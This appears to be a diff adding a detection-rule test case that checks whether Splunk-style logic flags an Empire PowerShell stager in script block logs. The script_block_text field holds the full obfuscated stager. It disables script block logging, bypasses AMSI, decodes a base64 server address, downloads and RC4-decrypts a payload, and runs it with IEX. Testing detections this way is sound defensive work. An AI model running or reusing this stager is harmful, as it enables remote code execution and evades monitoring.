@@ -1,0 +1,43 @@
+type: job
+name: Detect Empire with PowerShell Script Block Logging
+detection:
+  source: escu
+  name: "ESCU - Detect Empire with PowerShell Script Block Logging - Rule"
+  id: bc1dc6b8-c954-11eb-bade-acde48001122
+description: |
+  Validates detection of a PowerShell download stager that fetches its
+  payload with System.Net.WebClient: PowerShell/Operational EID 4104 (Script
+  Block Logging) records a block that turns off script block logging and
+  sets amsiInitFailed through reflection, decodes a server address with
+  [Convert]::FromBase64String, downloads data with WebClient.DownloadData,
+  RC4-decrypts it and runs the result with IEX. PowerShell logged the block
+  at Warning level, which it does for blocks it flags as suspicious.
+tags: [empire]
+
+mitre:
+  tactics: [execution]
+  techniques: [T1059.001]
+
+state:
+  domain_short:       CORP
+  domain_tld:         local
+  domain_short_lower: fn.lower(ref.domain_short)
+  domain_fqdn:        "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:           gen.hostname(class=windows-server, domain=ref.domain_fqdn)
+  level:              3
+
+workloads:
+  - scenario: scenarios/windows/powershell/script-block/script-block-logged
+    bindings:
+      domain_short:      ref.domain_short
+      domain_tld:        ref.domain_tld
+      computer:          ref.computer
+      level:             ref.level
+      provider_guid:     "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"
+      script_block_text: "IF($PSVerSiONTable.PSVersioN.MajoR -gE 3){$C322=[Ref].AsSemBLY.GETTYPE('System.Management.Automation.Utils').\"GetFIE`lD\"('cachedGroupPolicySettings','N'+'onPublic,Static');If($C322){$c742=$C322.GeTVALue($NULl);If($C742['ScriptB'+'lockLogging']){$C742['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$c742['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$vAL=[CoLLeCTIONs.GeNERiC.DicTioNary[strinG,System.OBjEct]]::nEW();$VAl.Add('EnableScriptB'+'lockLogging',0);$Val.Add('EnableScriptBlockInvocationLogging',0);$c742['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptB'+'lockLogging']=$val}Else{[SCriPtBLocK].\"GEtFIe`LD\"('signatures','N'+'onPublic,Static').SEtValuE($Null,(New-OBJEct COLlECtionS.GenerIC.HAshSEt[StrINg]))}$ReF=[ReF].AsSeMbLY.GeTTyPe('System.Management.Automation.Amsi'+'Utils');$REf.GetFIeld('amsiInitF'+'ailed','NonPublic,Static').SeTVALuE($nULL,$TRUe);};[SysTeM.NEt.SerVIcePoIntMANagER]::EXpECT100CONtinuE=0;$5793=NeW-ObJecT SysTEm.NEt.WebClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([TEXt.ENcoDiNG]::UNICOdE.GeTStRINg([CoNvERt]::FRoMBase64STRING('aAB0AHQAcAA6AC8ALwAzADQALgAyADEAOAAuADIAMwA1AC4AMgAxADkAOgA4ADAAOAAwAA==')));$t='/news.php';$5793.HEaDeRS.ADd('User-Agent',$u);$5793.PROXY=[SYsTEM.NEt.WeBRequEST]::DEFAuLtWEbProXY;$5793.PRoxy.CredenTiAls = [SYstem.NET.CREDenTiALCAche]::DEfAuLtNEtWORKCREDeNtiaLS;$Script:Proxy = $5793.Proxy;$K=[SySTem.TeXT.ENCoDinG]::ASCII.GetBYtes('Jf9z_?P}~Zu-,n;IN/A|#5%!>^ghsl2{');$R={$D,$K=$ARGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CoUnT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-BxOr$S[($S[$I]+$S[$H])%256]}};$5793.HeAdErS.Add(\"Cookie\",\"gHVlcrmdCWJeODGi=8AZFxuwcMahdbNHhHSY+a43LiiE=\");$dATa=$5793.DoWnLOadDaTa($sER+$t);$iv=$DatA[0..3];$daTA=$DATA[4..$daTA.lenGTH];-JoIN[ChAr[]](& $R $daTA ($IV+$K))|IEX\n"
+    expectation:
+      expected: alert
+      summary: "PowerShell runs a WebClient stager that decodes a base64 server address"
+      mitre:
+        tactics: [execution]
+        techniques: [T1059.001]
